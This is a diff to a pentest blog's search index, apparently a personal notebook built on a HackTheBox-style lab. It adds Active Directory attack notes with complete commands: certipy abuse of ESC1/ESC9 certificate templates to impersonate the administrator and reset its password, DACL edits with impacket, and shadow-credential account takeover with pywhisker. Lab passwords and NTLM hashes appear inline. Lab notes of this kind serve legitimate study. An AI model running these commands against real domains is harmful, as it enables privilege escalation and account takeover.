@@ -1662,8 +1662,18 @@ window.store = {
         
         "title": "Pentest - Active Directory - Certificate Services",
         "tags": ["cert","activeDirectory","pentest",],
-        "content": "Active Directory Certificate Services social.technet.microsoft.com\nActive Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton\nAbusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify\nPS C:\\ \u0026gt; .\\Certify.exe find /vulnerable Here\u0026rsquo;s an example of a vulnerable cert template, which is used for client authentication. Domain Users have enrollments rights, and they\u0026rsquo;re also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)\nPython https://github.com/ly4k/Certipy\nspecterops - certified pre-owned\nExamples ESC1 vulnerability Client Authentication: True - an issued certificate can be used for client authentication purposes.\nEnrollee Supplies Subject : True - a Subject Alternative Name can be specified which allows a certificate to be requested as another user on the system (e.g., administrator).\nRequires Manager Approval : False - a requested certificate doesn\u0026rsquo;t require approval from a user with certificate manager permissions.\nEnrollment Rights : Domain\\Domain Computers - this gives low-level users the ability to request a certificate by simply joining a computer to the domain.\nUser happens to be able to join machines to the domain \u0026ndash; from whoami /priv\nPrivilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled Use impacket to join a computer to the domain:\naddcomputer.py \u0026#39;domain/\u0026lt;user\u0026gt;:\u0026lt;pw\u0026gt;\u0026#39; -method LDAPS -computer-name \u0026#39;PC01\u0026#39; -computer-pass \u0026#39;Welcome123\u0026#39; Use certipy to request cert for admin\ncertipy req -username \u0026#39;PC01$\u0026#39; -password \u0026#39;Welcome123\u0026#39; -ca AUTHORITY-CA -target \u0026lt;ip\u0026gt; -template \u0026#39;\u0026#39; -upn \u0026#39;administrator@domain\u0026#39; Can try to auth\ncertipy auth -pfx administrator.pfx In this case there\u0026rsquo;s a kerberos session error -\u0026gt; authenticate with LDAP instead of kerberos. Use PassTheCert \u0026ndash; first convert\ncertipy cert -pfx administrator.pfx -nokey -out user.crt certipy cert -pfx administrator.pfx -nocert -out user.key Then, eg, change the admin password:\npython3 passthecert.py -action modify_user -crt user.crt -key user.key -domain \u0026lt;domain\u0026gt; -dc-ip \u0026lt;ip\u0026gt; -target administrator -new-pass ", 
+        "content": "Active Directory Certificate Services social.technet.microsoft.com\nActive Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton\nAbusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify\nPS C:\\ \u0026gt; .\\Certify.exe find /vulnerable Here\u0026rsquo;s an example of a vulnerable cert template, which is used for client authentication. Domain Users have enrollments rights, and they\u0026rsquo;re also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)\nPython https://github.com/ly4k/Certipy\nspecterops - certified pre-owned\nExamples ESC1 vulnerability Client Authentication: True - an issued certificate can be used for client authentication purposes.\nEnrollee Supplies Subject : True - a Subject Alternative Name can be specified which allows a certificate to be requested as another user on the system (e.g., administrator).\nRequires Manager Approval : False - a requested certificate doesn\u0026rsquo;t require approval from a user with certificate manager permissions.\nEnrollment Rights : Domain\\Domain Computers - this gives low-level users the ability to request a certificate by simply joining a computer to the domain.\nUser happens to be able to join machines to the domain \u0026ndash; from whoami /priv\nPrivilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled Use impacket to join a computer to the domain:\naddcomputer.py \u0026#39;domain/\u0026lt;user\u0026gt;:\u0026lt;pw\u0026gt;\u0026#39; -method LDAPS -computer-name \u0026#39;PC01\u0026#39; -computer-pass \u0026#39;Welcome123\u0026#39; Use certipy to request cert for admin\ncertipy req -username \u0026#39;PC01$\u0026#39; -password \u0026#39;Welcome123\u0026#39; -ca AUTHORITY-CA -target \u0026lt;ip\u0026gt; -template \u0026#39;\u0026#39; -upn \u0026#39;administrator@domain\u0026#39; Can try to auth\ncertipy auth -pfx administrator.pfx In this case there\u0026rsquo;s a kerberos session error -\u0026gt; authenticate with LDAP instead of kerberos. Use PassTheCert \u0026ndash; first convert\ncertipy cert -pfx administrator.pfx -nokey -out user.crt certipy cert -pfx administrator.pfx -nocert -out user.key Then, eg, change the admin password:\npython3 passthecert.py -action modify_user -crt user.crt -key user.key -domain \u0026lt;domain\u0026gt; -dc-ip \u0026lt;ip\u0026gt; -target administrator -new-pass Using netexec Enumerate services\n1 nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M adcs Determine vulnerabilities\n1 certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout ESC9 Can modify the UPN of users.\n1 certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator Then request a certificate\n1 2 certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -debug And change the UPN back:\n1 certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb masky\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dacl\/": {
+        
+        "title": "Pentest - Active Directory - DACL",
+        "tags": [],
+        "content": "Modifying DACLs Use Impacket:\n1 python3 dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;judith.mader\u0026#39; -target-dn \u0026#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB\u0026#39; \u0026#39;certified.htb\u0026#39;/\u0026#39;judith.mader\u0026#39;:\u0026#39;judith09\u0026#39; (or impacket-dacledit).\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dacl\/"
     },
     
     
@@ -1674,6 +1684,16 @@ window.store = {
         "tags": ["exploit","pentest","windowsExploitation",],
         "content": "hacktricks - DCSync\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dcsync\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_shadow_credentials\/": {
+        
+        "title": "Pentest - Active Directory - Shadow Credentials",
+        "tags": ["kerberos",],
+        "content": "Shadow Credentials pywhisker\nAbuse the GenericWrite ACL to get control of an account by adding shadow credentials:\n1 python3 /opt/pywhisker/pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:\n1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass \u0026#39;25nQ6mg4JUTeQEjjNRE2\u0026#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.py from the same toolkit to get the NTLM hash of the management_svc user.\ndsinternals Detecting shadow credentials hacker recipes hackingarticles medium\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_shadow_credentials\/"
     },
     
     
@@ -1694,6 +1714,16 @@ window.store = {
         "tags": ["activeDirectory","windowsExploitation","pentest",],
         "content": "hacktricks\nnetwrix\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_uac_bypass\/": {
+        
+        "title": "Pentest - Active Directory - UAC Bypass",
+        "tags": [],
+        "content": "Bypassing Windows UAC Mocking trusted directories\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_uac_bypass\/"
     },
     
     
